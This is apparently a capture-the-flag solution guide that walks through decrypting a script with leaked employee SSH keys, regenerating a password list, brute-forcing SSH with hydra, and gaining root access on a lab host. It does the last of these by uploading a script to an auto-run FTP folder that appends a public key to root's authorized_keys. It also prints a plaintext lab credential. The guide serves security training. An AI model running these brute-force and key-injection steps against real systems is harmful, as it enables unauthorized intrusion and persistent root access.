
# Where did I put my keys?

_Solution Guide_

## Overview 

This challenge is an incident response challenge, in which competitors must regain access to a compromised system. It involves writing various scripts to create a wordlist and retrieve SSH keys.


## Question 1

Which user's key was used to encrypt the script?

1. Log into `kali-workstation` wait about 2 minutes for startup scripts to complete.

2. The FTP server is accessible by `ftp ftp-server.us` with the credentials `user:tartans`.

3. Files will be found within the `files` directory: `encrypted.enc`, `rsa_key.enc`, `wordlist.txt` and a directory called `keys` containing all of the SSH keys for each employee (150 directories each containing `id_rsa` and `id_rsa.pub` files).

4. Open a new terminal and download all of the files from the directory using a command such as `wget -r -m ftp://user:tartans@ftp-server.us`. This will create a directory called `ftp-server.us` containing all of these files.

5. Since we don't know which user's key pair was used to generate the encryption, a script will be needed to try the decryption for every user. Create this script in the /home/user directory.

    ``` bash
    #!/bin/bash

    for user in ftp-server.us/files/keys/*
    do
        chmod 600 $user/id_rsa
        ssh-keygen -p -m PEM -N "" -f $user/id_rsa
        openssl rsautl -decrypt -oaep -inkey $user/id_rsa -in ftp-server.us/files/rsa_key.enc -out rsa_key.keygen
        openssl aes-256-cbc -d -in ftp-server.us/files/encrypted.enc -out $user.py -pass file:rsa_key.keygen

    done
    ```

6. Running this script (permissions may need to be changed with `sudo chmod +x script.sh`) will create a script called `user##.py` within `/home/user/ftp-server.us/files/keys/` that contains the code the attacker used to generate the password. `This user is the answer to Question 1.`

## Question 2

What is the token found on the ftp server?

1. Looking at the code, it can be seen that the password was generated using the provided wordlist.
    - Each word in the list was sorted by the sum of each letter's unicode value minus the time the script was execulted (August 16th as indicated by the challenge background)
    - Two words were then appended together based on the index of the word and the unicode value of the first letter of the word to create a sublist of 500 words
    - One of these 500 words was then chosen as the password
<br><br>

2. Since the script was encrypted and downloaded, the original metadata has been overwritten so the script will not run properly as is.

3. Therefore, we will have to comment out the part of the script where the variable `sort_val` was generated (`lines 14-18`) and manually change the `sort_val` to when the script was thought to have been run originally: `August 16th` or `816`

4. Then, since only one password was chosen at random, we will instead need to store the entire sublist by changing the last line to <br>`open("/home/user/passwd_gen", "w").write("\n".join(choices))`

5. The final edited script should look something like this

    ``` python
    import os, time, datetime, random

    def ord_sum(word):
        ord_val = 0
        for letter in word:
            ord_val += ord(letter)

        return ord_val

    choices = []

    #path = r"/home/user/genNewPass.py"

    #date = datetime.datetime.strptime(time.ctime(os.path.getmtime(path)), "%a %b %d %H:%M:%S %Y")

    #sort_val = int(str(date.month)+str(date.day))

    sort_val = 816

    words = open("/home/user/wordlist.txt", "r").read().splitlines()

    words.sort(key=lambda x: abs(ord_sum(x) - sort_val))

    for i in range(1, 501):
        choices.append(words[i] + words[ord(words[i][0])*(i//10)])

    open("/home/user/passwd_gen", "w").write("\n".join(choices))
    ```

6. Before executing the script, the permissions may need to be changed using `sudo chmod +x user##.py`. Also, move `/home/user/ftp-server.us/files/wordlist.txt` to the `/home/user/` directory.

7. Once the wordlist is generated, use a program such as `hydra` to try and brute force into `10.5.5.101` with each password <br>
`hydra -l user -P /home/user/passwd_gen 10.5.5.101 ssh`.

8. Once hydra finds the password, log into `10.5.5.101` with the found password.

9. On the desktop, you will be able to find the credentials for the `remote-user` on the FTP server (`remote-user:d0nTm4kEy0Urp45sW0rdPAs5woRd`). After logging into this user and navigating to the `files` directory, you will see a README that will contain the second `token`.


## Question 3

What is the token found on 10.5.5.128?

1. Any bash or python files uploaded to the `files` directory of this user will be automatically run. Keep in mind that the FTP server has SSH access to the final target machine.

2. When attempting to log into the final target machine, we will find that port 22 is no longer being used for SSH access for security reasons. To find the correct port, run: `nmap -p- 10.5.5.128`. Be sure to keep track of that port.

3. Attempting to log into the final target machine with the correct port will now yield a `Permission denied (publickey)` error, and since we know that the final machine only accepts SSH access via a `root` account, we will need to find a way to upload the public key of a `root` account to the final machine.

4. First we need to get the key found in the `ssh-access` machine's `root` .ssh folder.

5. From the `/root/.ssh` directory, copy either key to the user directory with `cp id_rsa.pub /home/user/` and upload it to the ftp server by logging in with
    - `ftp ftp-server.us` and the credentials `remote-user:d0nTm4kEy0Urp45sW0rdPAs5woRd`
    - `cd files`
    - `put id_rsa.pub`

6. We can now write a script to append that key to the final machine's `authorized_keys` folder, which can be run by uploading to the `remote-user`'s FTP directory.

7. One possible solution is to write a script like
    ``` bash
    #!/bin/bash

    sudo scp -P [ENTER PORT] /home/remote-user/ftp/files/id_rsa.pub root@10.5.5.128:/tmp/id_user
    sudo ssh -p [ENTER PORT] root@10.5.5.128 'cat /tmp/id_user >> /root/.ssh/authorized_keys'
    ```

    which will copy the key from the remote-user's directory into a tmp file in the target machine, then append that key into the machine's `authorized_keys` file.

8. Uploading the script, using the same method as the key upload in `step 20`, will allow access from the `root` account.

9. `sudo su` into the root account, then `ssh -p [ENTER PORT] root@10.5.5.128` and navigate to the Desktop. `cat` out the `token.txt` file to receive the final token.
